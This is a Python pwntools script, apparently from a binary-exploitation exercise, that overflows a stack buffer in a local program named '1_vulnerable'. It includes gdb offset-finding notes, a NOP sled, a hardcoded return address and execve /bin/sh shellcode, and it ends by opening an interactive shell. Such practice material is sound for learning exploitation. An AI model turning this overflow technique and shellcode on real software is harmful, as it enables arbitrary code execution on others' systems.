#!/usr/bin/python 

from pwn import *

def main(): 
	# Starts process
	p = process("./1_vulnerable")
	

	# For gdb
	raw_input(str(p.proc.pid))

	# gdb-peda$ pattern_offset 0x413b4141
	# 0xffffd6a0  1094402369found at offset: 28

	'''
	Thread 1 "1_vulnerable" hit Breakpoint 7, 0x0804845b in vuln ()
	gdb-peda$ x/48wx 0xffffd560
	0xffffd560:     0xffffd570      0xffffd570      0x00000064      0xf7e2d0ec
	0xffffd570:     0x41414141      0x41414141      0x41414141      0x41414141
	0xffffd580:     0x41414141      0x41414141      0x41414141      0xdeadbeef
	0xffffd590:     0xf7fc73dc      0xffffd5b0      0x00000000      0xf7e2d637
	0xffffd5a0:     0xf7fc7000      0xf7fc7000      0x00000000      0xf7e2d637
	0xffffd5b0:     0x00000001      0xffffd644      0xffffd64c      0x00000000
	0xffffd5c0:     0x00000000      0x00000000      0xf7fc7000      0xf7ffdc04
	0xffffd5d0:     0xf7ffd000      0x00000000      0xf7fc7000      0xf7fc7000
	0xffffd5e0:     0x00000000      0xf441a32f      0xce412d3f      0x00000000
	0xffffd5f0:     0x00000000      0x00000000      0x00000001      0x08048340
	0xffffd600:     0x00000000      0xf7fee010      0xf7fe8880      0xf7ffd000
	0xffffd610:     0x00000001      0x08048340      0x00000000      0x08048361
	gdb-peda$ x 0xffffd570 + 28
	0xffffd58c:     0xdeadbeef
	gdb-peda$ x 0xffffd570 + 28 + 4
	0xffffd590:     0xf7fc73dc
	gdb-peda$ info b
	Num     Type           Disp Enb Address    What
	7       breakpoint     keep y   0x0804845b <vuln+32>
	'''

	'''
	http://shell-storm.org/shellcode/files/shellcode-841.php
	Tiny execve sh shellcode	
	'''
	sh =  "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
	sh += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
	sh += "\x80"
 
	log.info("shellcode length : %s" % str(len(sh)) )

	ret_addr = 0xffffd570 + 28 + 4
	log.info('ret addr : 0x%x' % ret_addr)

	payload = "A" * 28 + p32(ret_addr)
	log.warn("EIP overwritten")

	nop = '\x90' * (200 - len(payload) - len(sh))
	log.info('nop length : %s' % str(len(nop)) )

	payload += nop + sh
	log.info("Payload crafted")

	# Testing: For EIP control	
	# payload = "A" *28 + p32(0xdeadbeef)

	# Testing: For EIP control	
	# Important: See if program breaks 
	# payload = "A" * 28 + p32(ret_addr)
	# payload = payload.ljust(200, '\xcc') 

	# For gdb
	#raw_input(str(p.proc.pid))

	# Sends payload 
	p.send(payload)
	log.warn("Payload sent!")

	# Pass interaction back to user
	p.interactive()

if __name__ == "__main__": 
	main()
